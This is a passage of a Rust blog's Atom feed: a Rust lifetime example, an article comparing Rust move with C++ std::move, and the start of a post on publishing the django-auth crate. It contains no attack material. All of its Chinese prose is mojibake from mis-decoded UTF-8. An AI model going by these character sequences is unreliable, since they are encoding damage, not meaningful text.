&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="k">struct&lt;/span> &lt;span class="nc">Ref&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="na">&amp;#39;a&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">T&lt;/span>: &lt;span class="na">&amp;#39;a&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="na">&amp;#39;a&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">T&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">fn&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="kd">let&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">string&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nb">String&lt;/span>::&lt;span class="n">from&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;string&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">t_bound&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">string&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c1">// âœ…
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">t_bound&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">Ref&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">string&lt;/span>&lt;span class="p">));&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c1">// âœ…
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">t_bound&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">Ref&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">string&lt;/span>&lt;span class="p">));&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c1">// âœ…
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">t_ref&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">string&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c1">// âœ…
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">t_ref&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">Ref&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">string&lt;/span>&lt;span class="p">));&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c1">// âŒ - expected ref, found struct
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">t_ref&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">Ref&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">string&lt;/span>&lt;span class="p">));&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c1">// âœ…
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="c1">// string var is bounded by &amp;#39;static which is bounded by &amp;#39;a
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">t_bound&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">string&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c1">// âœ…
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div></content><category scheme="https://mincodes.com/tags/rust/" term="Rust" label="Rust"/></entry><entry><title type="text">Rust çš„ move å’Œ C++ çš„ std::move</title><link rel="alternate" type="text/html" href="https://mincodes.com/posts/move-in-rust-and-cpp/"/><id>https://mincodes.com/posts/move-in-rust-and-cpp/</id><updated>2024-03-06T13:59:56+08:00</updated><published>2024-03-06T12:19:00+08:00</published><author><name>Min Deng</name><uri>https://mincodes.com/</uri></author><rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en)</rights><summary type="html">Rust çš„ move å’Œ C++ çš„ std::move åœ¨è¡¨é¢ä¸Šçœ‹æœ‰äº›ç›¸ä¼¼ä¹‹å¤„ï¼Œå› ä¸ºå®ƒä»¬éƒ½æ¶‰åŠåˆ°æ•°æ®æˆ–èµ„æºçš„è½¬ç§»ã€‚ç„¶è€Œï¼Œå®ƒä»¬åœ¨è®¾è®¡ç†å¿µã€å®ç°æ–¹â€¦</summary><content type="html">&lt;p>Rust çš„ &lt;code>move&lt;/code> å’Œ C++ çš„ &lt;code>std::move&lt;/code> åœ¨è¡¨é¢ä¸Šçœ‹æœ‰äº›ç›¸ä¼¼ä¹‹å¤„ï¼Œå› ä¸ºå®ƒä»¬éƒ½æ¶‰åŠåˆ°æ•°æ®æˆ–èµ„æºçš„è½¬ç§»ã€‚ç„¶è€Œï¼Œå®ƒä»¬åœ¨è®¾è®¡ç†å¿µã€å®ç°æ–¹å¼ä»¥åŠå®ƒä»¬åœ¨å„è‡ªè¯­è¨€ä¸­æ‰€æ‰®æ¼”çš„è§’è‰²ä¸Šæœ‰ç€æ ¹æœ¬çš„åŒºåˆ«ã€‚&lt;/p>
&lt;h2 id="rust-ä¸­çš„-move-è¯­ä¹‰">Rust ä¸­çš„ Move è¯­ä¹‰&lt;/h2>
&lt;dl>
&lt;dt>æ‰€æœ‰æƒè½¬ç§»&lt;/dt>
&lt;dd>Rust ä¸­çš„ move è¯­ä¹‰æ˜¯å…¶æ‰€æœ‰æƒç³»ç»Ÿçš„æ ¸å¿ƒéƒ¨åˆ†ã€‚å½“ä¸€ä¸ªå€¼ä»ä¸€ä¸ªå˜é‡ç§»åŠ¨åˆ°å¦ä¸€ä¸ªå˜é‡æ—¶ï¼ŒåŸå§‹å˜é‡ä¸å†æœ‰æƒè®¿é—®è¯¥å€¼ã€‚è¿™é¿å…äº†æ‚¬å‚æŒ‡é’ˆå’Œæ•°æ®ç«äº‰ç­‰é—®é¢˜ã€‚&lt;/dd>
&lt;dt>ç¼–è¯‘æ—¶æ£€æŸ¥&lt;/dt>
&lt;dd>Rust çš„ç¼–è¯‘å™¨åœ¨ç¼–è¯‘æ—¶å°±ä¼šæ£€æŸ¥æ‰€æœ‰æƒã€å€Ÿç”¨å’Œç”Ÿå‘½å‘¨æœŸè§„åˆ™ï¼Œç¡®ä¿å†…å­˜å®‰å…¨è€Œæ— éœ€è¿è¡Œæ—¶å¼€é”€ã€‚&lt;/dd>
&lt;dt>è‡ªåŠ¨æ§åˆ¶&lt;/dt>
&lt;dd>Rust çš„ move è¯­ä¹‰æ˜¯é€šè¿‡ç¼–è¯‘å™¨è‡ªåŠ¨å®ç°çš„ï¼Œä¸éœ€è¦ç¨‹åºå‘˜æä¾›ç‰¹æ®Šçš„ä»£ç æ¥æ”¯æŒ move
è¯­ä¹‰ã€‚&lt;/dd>
&lt;/dl>
&lt;h2 id="c-plus-plus-ä¸­çš„-move-è¯­ä¹‰">C++ ä¸­çš„ Move è¯­ä¹‰&lt;/h2>
&lt;dl>
&lt;dt>èµ„æºè½¬ç§»&lt;/dt>
&lt;dd>C++11 å¼•å…¥äº† move è¯­ä¹‰ï¼Œä¸»è¦ç”¨äºä¼˜åŒ–èµ„æºç®¡ç†ï¼Œå‡å°‘ä¸å¿…è¦çš„å¯¹è±¡å¤åˆ¶ã€‚é€šè¿‡
&lt;code>std::move&lt;/code> ï¼Œå¯ä»¥å°†ä¸€ä¸ªå¯¹è±¡çš„çŠ¶æ€æˆ–èµ„æºè½¬ç§»åˆ°å¦ä¸€ä¸ªå¯¹è±¡ï¼ŒåŸå¯¹è±¡åˆ™å¤„äºä¸€ä¸ªæœ‰æ•ˆä½†æœªå®šä¹‰çš„çŠ¶æ€ã€‚&lt;/dd>
&lt;dt>æ ‡å‡†åº“çš„æ”¯æŒ&lt;/dt>
&lt;dd>C++ çš„ move è¯­ä¹‰ä¸å…¶æ ‡å‡†åº“ç´§å¯†ç»“åˆï¼Œè®¸å¤šå®¹å™¨å’Œç®—æ³•éƒ½å¯¹ move è¯­ä¹‰è¿›è¡Œäº†ä¼˜åŒ–ã€‚&lt;/dd>
&lt;dt>æ‰‹åŠ¨æ§åˆ¶&lt;/dt>
&lt;dd>ä¸ Rust çš„è‡ªåŠ¨å’Œä¸¥æ ¼çš„æ‰€æœ‰æƒæ¨¡å‹ä¸åŒï¼ŒC++ ç¨‹åºå‘˜éœ€è¦æ›´å¤šåœ°æ‰‹åŠ¨ç®¡ç†èµ„æºå’Œä½¿ç”¨
move è¯­ä¹‰ï¼Œè¿™æä¾›äº†çµæ´»æ€§ä½†ä¹Ÿå¢åŠ äº†é”™è¯¯çš„å¯èƒ½æ€§ã€‚
&lt;p>å…·ä½“æ¥è®²ï¼ŒC++ çš„ move è¯­ä¹‰æ˜¯é€šè¿‡ç±»çš„ã€ç§»åŠ¨æ„é€ å‡½æ•°ã€å’Œã€ç§»åŠ¨èµ‹å€¼è¿ç®—ç¬¦ã€æ¥æä¾›æ”¯æŒçš„ã€‚&lt;/p>
&lt;/dd>
&lt;/dl>
&lt;h2 id="å¼‚åŒç‚¹åˆ†æ">å¼‚åŒç‚¹åˆ†æ&lt;/h2>
&lt;dl>
&lt;dt>è®¾è®¡ç†å¿µ&lt;/dt>
&lt;dd>Rust çš„ move è¯­ä¹‰è®¾è®¡ä¸»è¦æ˜¯ä¸ºäº†å®ç°å†…å­˜å®‰å…¨å’Œçº¿ç¨‹å®‰å…¨ï¼Œè€Œ C++ çš„ move è¯­ä¹‰æ›´å¤šæ˜¯ä¸ºäº†æ€§èƒ½ä¼˜åŒ–å’Œèµ„æºç®¡ç†ã€‚&lt;/dd>
&lt;dt>å®ç°æœºåˆ¶&lt;/dt>
&lt;dd>Rust åœ¨ç¼–è¯‘æ—¶å¼ºåˆ¶æ‰§è¡Œæ‰€æœ‰æƒè§„åˆ™ï¼Œå‡ ä¹ä¸å…è®¸è¿åè¿™äº›è§„åˆ™çš„ä»£ç é€šè¿‡ç¼–è¯‘ã€‚è€Œ C++
ç»™äº†ç¨‹åºå‘˜æ›´å¤šçš„æ§åˆ¶æƒï¼Œä½†è¿™ä¹Ÿæ„å‘³ç€æ›´é«˜çš„å‡ºé”™é£é™©ã€‚&lt;/dd>
&lt;dt>ä½¿ç”¨åœºæ™¯&lt;/dt>
&lt;dd>Rust çš„ move ç”¨äºæ‰€æœ‰æƒè½¬ç§»ï¼Œå¼ºè°ƒå®‰å…¨å’Œæ¸…æ™°çš„æ‰€æœ‰æƒæ¨¡å‹ã€‚C++ çš„ move æ›´å¤šæ˜¯ç”¨äºæ€§èƒ½ä¼˜åŒ–ï¼Œå°¤å…¶æ˜¯åœ¨å¤„ç†å¤§å‹å¯¹è±¡æˆ–èµ„æºå¯†é›†å‹å¯¹è±¡æ—¶ã€‚&lt;/dd>
&lt;/dl>
&lt;h2 id="æ·±å…¥åˆ°å†…å­˜å±‚é¢">æ·±å…¥åˆ°å†…å­˜å±‚é¢&lt;/h2>
&lt;p>å¦‚æœæˆ‘ä»¬æ·±å…¥åˆ°å†…å­˜å±‚é¢ï¼Œå°±ä¼šå‘ç°ï¼ŒRust çš„ move å’Œ C++ çš„ move åˆæœ‰ä¸€äº›ç›¸ä¼¼ä¹‹å¤„ã€‚&lt;/p>
&lt;p>å°±å†…å­˜æ“ä½œè€Œè¨€ï¼ŒRust ä¸­çš„ move è¿‡ç¨‹æœ¬è´¨ä¸Šæ˜¯å¯¹æ•°æ®ç»“æ„çš„æµ…æ‹·è´&lt;sup id="fnref:1">&lt;a href="https://mincodes.com/posts/move-in-rust-and-cpp/#fn:1" class="footnote-ref" role="doc-noteref">1&lt;/a>&lt;/sup>ï¼ˆå³æŒ‰å­—èŠ‚æ‹·è´ï¼‰ã€‚ä»¥ &lt;code>Vec&amp;lt;T&amp;gt;&lt;/code> ä¸ºä¾‹ï¼Œmove æ“ä½œæ¶‰åŠåˆ°çš„åªæ˜¯å¯¹æ•°æ®ç»“æ„å†…éƒ¨å­—æ®µï¼ˆæŒ‡é’ˆã€é•¿åº¦å’Œå®¹é‡ç­‰ï¼‰çš„æ‹·è´ï¼Œè€Œä¸ä¼šè§¦åŠå †ä¸Šçš„æ•°æ®æœ¬èº«ã€‚è¿™ç‚¹å’Œ C++ çš„ã€ç§»åŠ¨æ„é€ å‡½æ•°ã€çš„å®ç°å¾ˆç›¸ä¼¼ï¼ŒåŒºåˆ«åœ¨äºï¼š&lt;/p>
&lt;ul>
&lt;li>C++ åœ¨æµ…æ‹·è´ä¹‹åï¼Œéœ€è¦å°†åŸå§‹å¯¹è±¡çš„å­—æ®µé‡ç½®ï¼Œä»¥é˜²æ­¢ææ„å‡½æ•°å¤šæ¬¡é‡Šæ”¾èµ„æºã€‚&lt;/li>
&lt;li>Rust åˆ™ç›´æ¥é€šè¿‡ç¼–è¯‘å™¨ä¿è¯åŸå§‹å¯¹è±¡ä¸å†å¯ç”¨ï¼Œåœ¨å®‰å…¨æ€§ä¸Šæ›´èƒœä¸€ç­¹ã€‚&lt;/li>
&lt;/ul>
&lt;p>å½“ç„¶ï¼Œå¦‚å‰æ‰€è¿°ï¼Œæ•´ä¸ªè¿‡ç¨‹ Rust æ˜¯è‡ªåŠ¨å®Œæˆçš„ï¼Œè€Œ C++ éœ€è¦ç”±ç¨‹åºå‘˜æ¥æ‰‹å·¥å®Œæˆã€‚&lt;/p>
&lt;h2 id="æ€»ç»“">æ€»ç»“&lt;/h2>
&lt;p>ç»¼ä¸Šæ‰€è¿°ï¼ŒRust çš„ move å’Œ C++ çš„ move åœ¨è®¾è®¡ç†å¿µã€å®ç°æœºåˆ¶å’Œä½¿ç”¨åœºæ™¯æ–¹é¢éƒ½å­˜åœ¨è¾ƒå¤§å·®å¼‚ï¼Œä½†ä¸¤è€…åœ¨èµ„æºè½¬ç§»æ–¹é¢åˆæœ‰ä¸€äº›ç›¸ä¼¼ä¹‹å¤„ï¼Œä¾‹å¦‚éƒ½å¯ä»¥é€šè¿‡æµ…æ‹·è´æ¥å®Œæˆèµ„æºçš„é«˜æ•ˆè½¬ç§»ã€‚é€šè¿‡è¿™ç§å¯¹æ¯”åˆ†æï¼Œæˆ‘ä»¬å¯ä»¥æ›´è¿›ä¸€æ­¥ç†è§£ &lt;code>move&lt;/code> è¿™ä¸ªæ¦‚å¿µã€‚&lt;/p>
&lt;div class="footnotes" role="doc-endnotes">
&lt;hr>
&lt;ol>
&lt;li id="fn:1">
&lt;p>è¿™ç‚¹å¯ä»¥é€šè¿‡ç”Ÿæˆ Rust æºç çš„ LLVM IR æ¥éªŒè¯ï¼ˆå‘½ä»¤ï¼š &lt;code>cargo rustc -- --emit=llvm-ir&lt;/code> ï¼‰ï¼Œä¾‹å¦‚è¿™ä¸ª&lt;a href="https://stackoverflow.com/a/30290070/1066512">æ¡ˆä¾‹&lt;/a>ã€‚&amp;#160;&lt;a href="https://mincodes.com/posts/move-in-rust-and-cpp/#fnref:1" class="footnote-backref" role="doc-backlink">&amp;#x21a9;&amp;#xfe0e;&lt;/a>&lt;/p>
&lt;/li>
&lt;/ol>
&lt;/div></content><category scheme="https://mincodes.com/tags/rust/" term="Rust" label="Rust"/></entry><entry><title type="text">å‘å¸ƒæˆ‘çš„ç¬¬ä¸€ä¸ª Crate: django-auth</title><link rel="alternate" type="text/html" href="https://mincodes.com/posts/publish-crate-django-auth/"/><id>https://mincodes.com/posts/publish-crate-django-auth/</id><updated>2024-01-14T19:37:41+08:00</updated><published>2024-01-14T19:37:00+08:00</published><author><name>Min Deng</name><uri>https://mincodes.com/</uri></author><rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en)</rights><summary type="html">ä»Šå¤©å‘å¸ƒäº†æˆ‘çš„ç¬¬ä¸€ä¸ª crate: django-auth, è™½ç„¶æ˜¯ä¸€ä¸ªéå¸¸ç®€å•çš„ crate, ä½†éº»é›€è™½å°ï¼Œäº”è„ä¿±å…¨ï¼ŒAPI æ–‡æ¡£ã€æµ‹è¯•ç”¨ä¾‹ã€doc test ç­‰â€¦</summary><content type="html">&lt;p>ä»Šå¤©å‘å¸ƒäº†æˆ‘çš„ç¬¬ä¸€ä¸ª crate: &lt;a href="https://crates.io/crates/django-auth">django-auth&lt;/a>, è™½ç„¶æ˜¯ä¸€ä¸ªéå¸¸ç®€å•çš„ crate, ä½†éº»é›€è™½å°ï¼Œäº”è„ä¿±å…¨ï¼ŒAPI æ–‡æ¡£ã€æµ‹è¯•ç”¨ä¾‹ã€doc test ç­‰ä¸€ä¸ªéƒ½ä¸èƒ½å°‘ ğŸ˜ã€‚&lt;/p>
&lt;p>å…ˆç®€å•ä»‹ç»ä¸€ä¸‹è¿™ä¸ªåº“ï¼Œç„¶åå†ä»‹ç»ä¸€ä¸‹åœ¨ &lt;a href="https://crates.io/">crates.io&lt;/a> ä¸Šå‘å¸ƒ crate çš„æµç¨‹ã€‚&lt;/p>
&lt;h2 id="django-auth">django-auth&lt;/h2>
&lt;p>&lt;a href="https://www.djangoproject.com/">Django&lt;/a> æ˜¯ä¸€ä¸ª Python çš„ web framework, è‹¥å¹²å¹´å‰ç”¨æ›¾ç» Django å†™è¿‡ä¸€äº› Web åº”ç”¨ã€‚æœ€è¿‘åˆšå¥½åœ¨å­¦ä¹  Rust, å› æ­¤è®¡åˆ’ç”¨ Rust å°†å…¶ä¸­ä¸€ä¸ªåº”ç”¨é‡å†™ä¸€éç»ƒç»ƒæ‰‹ã€‚&lt;/p>
&lt;p>é¦–å…ˆé‡åˆ°çš„ç¬¬ä¸€ä¸ªé—®é¢˜ï¼Œä¾¿æ˜¯è´¦å·é‰´æƒçš„é—®é¢˜ï¼š&lt;/p>
&lt;ol>
&lt;li>æ—§çš„åº”ç”¨ä½¿ç”¨çš„æ˜¯ Django çš„ auth ä½“ç³»ï¼Œæ•°æ®åº“ä¸­ä¿å­˜çš„å¯†ç  hash å€¼ç”± Django æ¡†æ¶è‡ªåŠ¨ç”Ÿæˆï¼›&lt;/li>
&lt;li>å¦‚æœä¸å¸Œæœ›è®©æ‰€æœ‰ç”¨æˆ·é‡ç½®å¯†ç ï¼ˆè¿™æ ·åšä¼šå¯¼è‡´æ‰€æœ‰ç”¨æˆ·çš„æ—§å¯†ç å¤±æ•ˆï¼‰ï¼Œå°±éœ€è¦åœ¨æ–°å†™çš„ Rust åº”ç”¨ä¸­å…¼å®¹ Django çš„ auth ä½“ç³»ï¼›&lt;/li>
&lt;li>è¦æƒ³å…¼å®¹ Django çš„ auth ä½“ç³»ï¼Œå°±éœ€è¦å°† Django ç”Ÿæˆçš„ auth æ•°æ®åº“è¡¨è¿ç§»å‡ºæ¥ï¼Œå¹¶ä¸”èƒ½å¤Ÿåˆ©ç”¨è¿™äº›æ•°æ®æ¥éªŒè¯ç”¨æˆ·å¯†ç ã€‚&lt;/li>
&lt;/ol>
&lt;p>ç»è¿‡ä¸Šé¢è¿™ä¹ˆä¸€ç•ªåˆ†æï¼Œç›¸ä¿¡ä½ åº”è¯¥çŸ¥é“è¿™ä¸ª crate æ˜¯å¹²ä»€ä¹ˆçš„äº†ã€‚ä¸»è¦å°±ä¸¤ä¸ªåŠŸèƒ½ï¼š&lt;/p>
&lt;ul>
&lt;li>éªŒè¯ç”¨æˆ·è¾“å…¥çš„å¯†ç æ˜¯å¦æ­£ç¡®ï¼Œå¯¹åº” APIï¼š &lt;a href="https://docs.rs/django-auth/latest/django_auth/fn.django_auth.html">django_auth&lt;/a>&lt;/li>
&lt;li>ä¸ºæ–°ç”¨æˆ·ï¼ˆæˆ–è€…å½“ç”¨æˆ·ä¿®æ”¹å¯†ç æ—¶ï¼‰ï¼Œç”Ÿæˆ Django é£æ ¼çš„ hashed password, å¯¹åº”
API: &lt;a href="https://docs.rs/django-auth/latest/django_auth/fn.django_encode_password.html">django_encode_password&lt;/a>&lt;/li>
&lt;/ul>
&lt;blockquote>
&lt;p>ğŸŒŸ å¦‚æœå¯¹ Django çš„å¯†ç å­˜å‚¨æ ¼å¼æ„Ÿå…´è¶£ï¼Œå¯ä»¥å‚è€ƒè¿™ä¸ªæ–‡æ¡£ï¼š&lt;a href="https://docs.djangoproject.com/en/5.0/topics/auth/passwords/">Password management in
Django&lt;/a> ã€‚&lt;/p>
&lt;/blockquote>
&lt;p>é™¤äº†å¯ä»¥ä½œä¸º lib ä½¿ç”¨å¤–ï¼Œè¿˜é™„èµ äº†ä¸€ä¸ª cli å·¥å…·ï¼Œç”¨æ¥éªŒè¯å¯†ç ã€å¯¹å¯†ç è¿›è¡Œç¼–ç ï¼š&lt;/p>
&lt;p>&lt;code>$ cargo run --example auth&lt;/code>:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-text" data-lang="text">&lt;span class="line">&lt;span class="cl">Authenticate or generate Django-managed passwords
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Usage: auth &amp;lt;COMMAND&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Commands:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> encode Encode a password in Django-style
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> verify Verify a Django stored hashed password
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> help Print this message or the help of the given subcommand(s)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Options:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> -h, --help Print help
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> -V, --version Print version
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>ğŸš€ å°±è¿™ä¹ˆç®€å•ï¼&lt;/p>
&lt;h2 id="crate-å‘å¸ƒæµç¨‹">Crate å‘å¸ƒæµç¨‹&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>åˆ›å»º crate.io è´¦å·&lt;/p>
&lt;p>æ‰“å¼€ç½‘ç«™ &lt;a href="https://crates.io/">crate.io&lt;/a>ï¼Œç‚¹å‡»å³ä¸Šè§’ç™»å½• crate.ioã€‚éœ€è¦æ³¨æ„ä¸¤ç‚¹ï¼š&lt;/p>
&lt;ul>
&lt;li>ç›®å‰åªæ”¯æŒ github è´¦å·ç™»å½•ã€‚&lt;/li>
&lt;li>ç”¨äºç™»å½•çš„ github è´¦å·ä¼¼ä¹è¦å…ˆæ‹¥æœ‰ä¸€ä¸ª Organizationï¼ˆæˆ‘å› ä¸ºä¹‹å‰å·²ç»æœ‰
Organizationï¼Œæ‰€ä»¥ä¸ç¡®å®šæ²¡æœ‰è¡Œä¸è¡Œï¼‰ã€‚&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>è·å– API token&lt;/p>
&lt;p>æ‰“å¼€ &lt;a href="https://crates.io/settings/tokens">API Token&lt;/a> é¡µé¢ï¼ŒæŒ‰ç…§æŒ‡ç¤ºç”Ÿæˆä¸€ä¸ª API token, å¤åˆ¶ token, ç„¶ååˆ°å‘½ä»¤è¡Œè¿è¡Œï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl"> cargo login
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>æŒ‰ç…§æç¤ºå°† token ç²˜è´´å¹¶å›è½¦å³å¯ã€‚&lt;/p>
&lt;/li>
&lt;li>
&lt;p>éªŒè¯é‚®ç®±&lt;/p>
&lt;p>å‘å¸ƒ crate å‰éœ€è¦å…ˆéªŒè¯é‚®ç®±ï¼Œå¦åˆ™ä¼šå‘å¸ƒå¤±è´¥ã€‚æ‰“å¼€ &lt;a href="https://crates.io/settings/profile">profile&lt;/a> é¡µï¼ŒæŒ‰ç…§æŒ‡ç¤ºå¡«å…¥é‚®ç®±å¹¶éªŒè¯å³å¯ã€‚&lt;/p>
&lt;/li>
&lt;li>
&lt;p>å¡«å†™ package ä¿¡æ¯&lt;/p>
&lt;p>å‘å¸ƒå‰éœ€è¦åœ¨ &lt;code>Cargo.toml&lt;/code> æ–‡ä»¶ä¸­çš„ &lt;code>package&lt;/code> æ®µä¸­å¡«å†™å¦‚ä¸‹ä¿¡æ¯ï¼š&lt;/p>
&lt;ul>
&lt;li>&lt;strong>license or license-file:&lt;/strong> ç‰ˆæƒä¿¡æ¯ã€‚&lt;/li>
&lt;li>&lt;strong>description:&lt;/strong> åº“çš„ä¸€å¥è¯ä»‹ç»ã€‚&lt;/li>
&lt;li>&lt;strong>homepage:&lt;/strong> ä¸»é¡µã€‚&lt;/li>
&lt;li>&lt;strong>documentation:&lt;/strong> æ–‡æ¡£é“¾æ¥ï¼ˆå¯é€‰ï¼Œä¸å¡«åˆ™ä¼šè‡ªåŠ¨ä½¿ç”¨è¯¥ crate å¯¹åº”çš„ &lt;a href="https://docs.rs/">docs.rs&lt;/a>
æ–‡æ¡£é“¾æ¥ï¼‰ã€‚&lt;/li>
&lt;li>&lt;strong>repository:&lt;/strong> ä»£ç ä»“åº“ã€‚&lt;/li>
&lt;li>&lt;strong>readme:&lt;/strong> readme æ–‡ä»¶åï¼ˆå¯é€‰ï¼Œå¦‚æœæœ‰ README.md æ–‡ä»¶ï¼Œä¼šè‡ªåŠ¨ä½¿ç”¨ï¼‰ã€‚&lt;/li>
&lt;/ul>
&lt;p>æ›´è¯¦ç»†çš„ä¿¡æ¯å¯ä»¥å‚è€ƒ &lt;a href="https://doc.rust-lang.org/cargo/reference/publishing.html">å®˜æ–¹çš„ Crate å‘å¸ƒæŒ‡å—&lt;/a>ï¼Œä¹Ÿå¯ä»¥å‚è€ƒ django-auth çš„
&lt;a href="https://github.com/mindeng/django-auth/blob/main/Cargo.toml">Cargo.toml&lt;/a> ã€‚&lt;/p>
&lt;/li>
&lt;li>
&lt;p>å‘å¸ƒ Crate&lt;/p>
&lt;p>package ä¿¡æ¯ç¡®è®¤åï¼Œå¯ä»¥åœ¨ä½ çš„ crate é¡¹ç›®æ ¹ç›®å½•ï¼Œå…ˆè¿è¡Œå¦‚ä¸‹å‘½ä»¤æ£€æŸ¥ä¸€ä¸‹å‘å¸ƒæµç¨‹ï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
